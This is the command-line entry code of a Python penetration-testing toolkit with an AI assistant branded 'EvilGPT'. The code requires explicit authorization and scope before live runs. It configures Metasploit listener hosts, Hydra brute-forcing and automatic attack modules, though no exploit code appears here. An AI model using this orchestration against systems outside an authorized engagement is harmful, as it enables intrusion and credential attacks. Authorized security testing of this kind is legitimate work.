    p.add_argument("--ask", help="one-shot question for EvilGPT, then exit")
    p.add_argument("--chat", action="store_true", help="interactive EvilGPT session after run")
    p.add_argument("--dry-run", action="store_true", help="print commands without executing")
    p.add_argument("-v", "--verbose", action="store_true", help="debug logging")
    p.add_argument("--about", action="store_true", help="show tool info and exit")
    p.add_argument("--version", action="version",
                   version=f"EIK v{__version__} - Ethical Intelligence Toolkit - "
                           f"Founder: {FOUNDER} - AI core: EvilGPT (Gemini)")
    return p


ASSESSMENT_PROFILES = {
    "passive": [1, 7, 8],
    "standard": [1, 2, 3, 4, 7, 8],
    "active": [m[0] for m in MODULES],
}


def selected_modules(args: argparse.Namespace) -> List[int]:
    return ASSESSMENT_PROFILES[args.assessment_profile] if args.assessment_profile \
        else parse_choices(args.modules)


def enforce_severity_gate(outdir: Path, fail_on: Optional[str]) -> None:
    if not fail_on:
        return
    path = outdir / "report" / "summary.json"
    if not path.exists():
        log.warning("severity gate skipped: run module 7 to generate a report")
        return
    try:
        findings = json.loads(path.read_text(encoding="utf-8")).get("findings", [])
    except (OSError, json.JSONDecodeError):
        log.warning("severity gate skipped: invalid report summary")
        return
    threshold = SEV_ORDER[fail_on.capitalize()]
    triggered = [f for f in findings if SEV_ORDER.get(f.get("severity"), 0) >= threshold]
    if triggered:
        raise SystemExit(3)


def prepare_engagement(args: argparse.Namespace, target: Target, outdir: Path,
                       choices: List[int]) -> None:
    """Enforce the explicit authorization and scope contract for live work."""
    if args.dry_run:
        write_run_manifest(outdir, target, args, choices, [])
        return
    if not args.authorized or not args.engagement_id or not args.scope:
        raise ValueError(
            "live runs require --authorized, --engagement-id, and --scope FILE; "
            "use --dry-run to preview commands"
        )
    scope_entries = validate_scope(target, args.scope)
    active = sorted(set(choices) & ACTIVE_MODULES)
    if active and not args.allow_active:
        raise ValueError(
            f"modules {','.join(map(str, active))} require --allow-active; "
            "select 1-4,7,8 for non-invasive assessment"
        )
    manifest = write_run_manifest(outdir, target, args, choices, scope_entries)
    log.info(f"engagement validated ({args.engagement_id}); manifest: {manifest}")


def interactive_wizard(args: argparse.Namespace) -> None:
    raw = input(f"\n{BOLD}[>]{RESET} Enter target URL or IP: ").strip()
    while not raw:
        raw = input(f"{BOLD}[>]{RESET} Target cannot be empty: ").strip()
    t = Target(raw)
    print(f"\n{BOLD}Target summary:{RESET}\n{t.summary()}")
    outdir = Path(args.outdir) / re.sub(r"[^a-zA-Z0-9._-]", "_", t.host)
    r = Runner(outdir, dry_run=args.dry_run)
    doctor(r)
    ai = None if args.no_ai else get_copilot(args)
    if ai:
        log.info("AI hub ACTIVE - EvilGPT will brief you after each phase")
    print_modules()
    choices = selected_modules(args) if args.assessment_profile else parse_choices(
        input(f"{BOLD}[>]{RESET} Which modules? (e.g. 1,3,5 / all): "))
    while not choices:
        choices = parse_choices(input("  invalid - try again (e.g. 1,3,5 / all): "))
    prepare_engagement(args, t, outdir, choices)
    cfg = build_cfg(r)
    if args.lhost:
        cfg["msf"]["lhost"] = args.lhost
    cfg["hydra_service"] = args.hydra_service
    profile = "fast" if args.fast else ("stealth" if args.stealth else "normal")
    run_selected(choices, t, r, cfg, interactive=True,
                 parallel=args.parallel, vuln=args.vuln, profile=profile,
                 auto_attack=not args.no_auto_attack, threads=args.threads,
                 baseline=Path(args.baseline) if args.baseline else None, sarif=args.sarif, ai=ai)
    artifact_tree(outdir)
    if 7 not in choices and not args.no_ai and ai:
        if input("\nWrite the report now? [y/N] > ").strip().lower() in ("y", "yes"):
            ReportModule(r, t, baseline=Path(args.baseline) if args.baseline else None,
                         sarif=args.sarif).run()
    if ai:
        if input("\nStart EvilGPT chat session? [y/N] > ").strip().lower() in ("y", "yes"):
            ai.chat(outdir)
    pdf = outdir / "report" / "report.pdf"
    if pdf.exists() and input("\nOpen report.pdf? [y/N] > ").strip().lower() in ("y", "yes"):
        opener = "xdg-open" if os.name == "posix" else "open"
        subprocess.Popen([opener, str(pdf)])


def cli_mode(args: argparse.Namespace) -> None:
    t = Target(args.target)
    print(f"{BOLD}Target:{RESET} {t.raw}\n{t.summary()}")
    outdir = Path(args.outdir) / re.sub(r"[^a-zA-Z0-9._-]", "_", t.host)
    r = Runner(outdir, dry_run=args.dry_run)
    doctor(r)
    ai = None if args.no_ai else get_copilot(args)
    if args.ask and ai:
        print(ai.ask(args.ask, outdir))
        return
    if args.ask and not ai:
        log.error("--ask requires the AI hub (set GEMINI_API_KEY, don't use --no-ai)")
        sys.exit(1)
    choices = selected_modules(args)
    if not choices:
        log.error("no valid modules parsed - use e.g. -m 1,3,5 or -m all")
        sys.exit(1)
    prepare_engagement(args, t, outdir, choices)
    cfg = build_cfg(r)
    if args.lhost:
        cfg["msf"]["lhost"] = args.lhost
    cfg["hydra_service"] = args.hydra_service
    profile = "fast" if args.fast else ("stealth" if args.stealth else "normal")
    run_selected(choices, t, r, cfg, interactive=False,
                 parallel=args.parallel, vuln=args.vuln, profile=profile,
                 auto_attack=not args.no_auto_attack, threads=args.threads,
                 baseline=Path(args.baseline) if args.baseline else None, sarif=args.sarif, ai=ai)
    enforce_severity_gate(outdir, args.fail_on)
    artifact_tree(outdir)
    if args.chat and ai:
        ai.chat(outdir)


def main() -> None:
    print_banner()  # Display ASCII art logo
    args = build_parser().parse_args()
    get_logger(args.verbose)
    if args.about:
        print(f"\n{BOLD}═══════════════════════════════════════════════════════════════{RESET}")
        print(f"  {BOLD}ETHICAL INTELLIGENCE TOOLKIT v3.0 - COMPREHENSIVE{RESET}")
        print(f"{BOLD}═══════════════════════════════════════════════════════════════{RESET}")
        print(f"  version  : v{__version__}")
        print(f"  founder  : {FOUNDER}")
        print(f"  ai core  : EvilGPT (Gemini) - {args.ai_model}")
        print(f"  modules  : {len(MODULES)}")
        print("  requires : Kali Linux + tools listed in --help; GEMINI_API_KEY for AI")
        return
    try:
        if args.target:
            cli_mode(args)
        else:
            interactive_wizard(args)
    except KeyboardInterrupt:
        log.warning("\naborted by user")
        sys.exit(130)
    except ValueError as exc:
        log.error(str(exc))
        sys.exit(2)


if __name__ == "__main__":
    main()
